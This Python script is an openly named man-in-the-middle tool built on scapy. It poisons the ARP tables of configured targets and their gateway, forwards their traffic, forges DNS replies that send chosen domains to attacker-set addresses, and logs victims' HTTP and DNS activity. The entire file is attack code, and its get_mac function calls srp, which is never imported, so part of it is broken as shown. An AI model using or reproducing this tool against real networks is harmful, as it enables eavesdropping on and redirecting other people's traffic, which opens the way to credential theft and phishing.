#!/usr/bin/env python3
import argparse
import sys
import os
import signal
import time
import yaml
from scapy.all import ARP, send, sniff, Ether, IP, UDP, DNS, DNSQR, DNSRR
from scapy.layers.inet import TCP
import subprocess

class MITMAttack:
    def __init__(self, config_file):
        with open(config_file, 'r') as f:
            self.config = yaml.safe_load(f)
        
        self.attacker_ip = self.config['attacker_ip']
        self.attacker_mac = self.config['attacker_mac']
        self.gateway_ip = self.config['gateway_ip']
        self.gateway_mac = None
        self.target_ips = self.config['targets']
        self.dns_spoof_map = self.config.get('dns_spoof', {})
        
        self.running = True
    
    def check_root(self):
        if os.geteuid() != 0:
            print("[!] Must run as root (sudo)")
            sys.exit(1)
    
    def get_mac(self, ip):
        """Resolve IP to MAC via ARP"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    
    def spoof_arp(self, target_ip, spoof_ip):
        """Send spoofed ARP reply: 'spoof_ip is at attacker_mac'"""
        packet = ARP(op="is-at", pdst=target_ip, hwdst=self.get_mac(target_ip),
                    psrc=spoof_ip, hwsrc=self.attacker_mac)
        send(packet, verbose=False)
    
    def restore_arp(self, target_ip, restore_ip):
        """Restore original ARP table"""
        target_mac = self.get_mac(target_ip)
        restore_mac = self.get_mac(restore_ip)
        
        if target_mac and restore_mac:
            packet = ARP(op="is-at", pdst=target_ip, hwdst=target_mac,
                        psrc=restore_ip, hwsrc=restore_mac)
            send(packet, count=4, verbose=False)
    
    def enable_ip_forwarding(self):
        """Allow traffic to pass through this machine"""
        os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
        os.system(f"iptables -A FORWARD -i eth0 -o eth0 -j ACCEPT > /dev/null 2>&1")
    
    def dns_hijack_callback(self, packet):
        """Intercept DNS queries and respond with spoofed IPs"""
        if packet.haslayer(DNS):
            dns_layer = packet[DNS]
            
            # Only handle DNS queries (QR=0)
            if dns_layer.qr == 0:
                question = dns_layer.qd.qname.decode('utf-8').rstrip('.')
                
                # Check if this domain should be spoofed
                if question in self.dns_spoof_map:
                    spoofed_ip = self.dns_spoof_map[question]
                    
                    # Build response
                    response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                               UDP(dport=packet[UDP].sport, sport=53) / \
                               DNS(id=dns_layer.id, qd=dns_layer.qd,
                                   aa=1, qr=1,
                                   an=DNSRR(rrname=dns_layer.qd.qname, ttl=10,
                                           rdata=spoofed_ip))
                    
                    send(response, verbose=False)
                    print(f"[+] Spoofed DNS: {question} -> {spoofed_ip}")
    
    def start_arp_spoof(self):
        """Begin ARP spoofing loop"""
        print("[*] Starting ARP spoofing...")
        print(f"[*] Targets: {self.target_ips}")
        
        try:
            while self.running:
                for target in self.target_ips:
                    # Spoof target: gateway IP is at attacker MAC
                    self.spoof_arp(target, self.gateway_ip)
                    # Spoof gateway: target IP is at attacker MAC
                    self.spoof_arp(self.gateway_ip, target)
                
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    
    def start_dns_hijack(self):
        """Sniff and hijack DNS queries"""
        print("[*] Starting DNS hijacking...")
        print(f"[*] Spoofed domains: {list(self.dns_spoof_map.keys())}")
        
        try:
            sniff(prn=self.dns_hijack_callback, filter="udp port 53", store=False)
        except KeyboardInterrupt:
            pass
    
    def start_traffic_sniffer(self):
        """Capture all traffic passing through"""
        print("[*] Starting traffic capture...")
        
        def packet_callback(packet):
            if packet.haslayer(IP):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                
                # Log HTTP traffic
                if packet.haslayer(TCP) and packet[TCP].dport == 80:
                    print(f"[HTTP] {src_ip} -> {dst_ip}:{packet[TCP].dport}")
                
                # Log DNS queries
                if packet.haslayer(DNS):
                    dns = packet[DNS]
                    if dns.qr == 0:
                        query = dns.qd.qname.decode('utf-8').rstrip('.')
                        print(f"[DNS] {src_ip} -> {query}")
        
        try:
            sniff(prn=packet_callback, store=False)
        except KeyboardInterrupt:
            pass
    
    def cleanup(self, sig=None, frame=None):
        """Restore ARP tables and exit"""
        print("\n[*] Restoring ARP tables...")
        self.running = False
        
        for target in self.target_ips:
            self.restore_arp(target, self.gateway_ip)
            self.restore_arp(self.gateway_ip, target)
        
        print("[+] Cleanup complete")
        sys.exit(0)
    
    def run(self):
        self.check_root()
        
        signal.signal(signal.SIGINT, self.cleanup)
        signal.signal(signal.SIGTERM, self.cleanup)
        
        self.enable_ip_forwarding()
        
        # Start threads
        import threading
        
        spoof_thread = threading.Thread(target=self.start_arp_spoof, daemon=True)
        dns_thread = threading.Thread(target=self.start_dns_hijack, daemon=True)
        sniff_thread = threading.Thread(target=self.start_traffic_sniffer, daemon=True)
        
        spoof_thread.start()
        dns_thread.start()
        sniff_thread.start()
        
        print("[+] MITM attack running. Press Ctrl+C to stop.\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.cleanup()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ARP Spoofing + DNS Hijacking MITM')
    parser.add_argument('--config', default='config/targets.yaml', help='Config file')
    args = parser.parse_args()
    
    attack = MITMAttack(args.config)
    attack.run()
